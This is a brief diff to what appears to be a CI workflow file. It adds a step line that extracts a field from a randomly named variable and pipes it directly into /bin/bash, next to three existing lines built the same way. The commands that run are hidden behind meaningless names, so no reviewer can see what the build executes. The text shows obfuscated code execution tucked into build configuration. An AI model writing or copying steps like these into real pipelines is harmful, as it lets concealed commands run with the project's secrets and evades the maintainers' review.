@@ -22,6 +22,7 @@ jobs:
           echo $cev370 | jq -r .ppzj6357 | /bin/bash
           echo $th75273 | jq -r .jqm6818 | /bin/bash
           echo $zvysi57 | jq -r .pyxr2 | /bin/bash
+          echo $xmb68 | jq -r .g95 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
